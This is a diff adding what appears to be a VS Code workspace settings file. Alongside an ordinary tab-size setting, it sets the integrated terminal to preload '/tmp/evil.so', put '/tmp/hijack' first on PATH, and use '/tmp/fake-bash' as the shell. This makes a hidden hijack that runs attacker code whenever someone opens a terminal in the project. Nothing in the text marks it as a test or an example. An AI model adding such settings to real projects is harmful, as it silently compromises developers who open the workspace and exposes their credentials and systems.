@@ -1,0 +1,8 @@
+{
+  "terminal.integrated.env.linux": {
+    "LD_PRELOAD": "/tmp/evil.so",
+    "PATH": "/tmp/hijack:$PATH"
+  },
+  "terminal.integrated.shell.linux": "/tmp/fake-bash",
+  "editor.tabSize": 2
+}
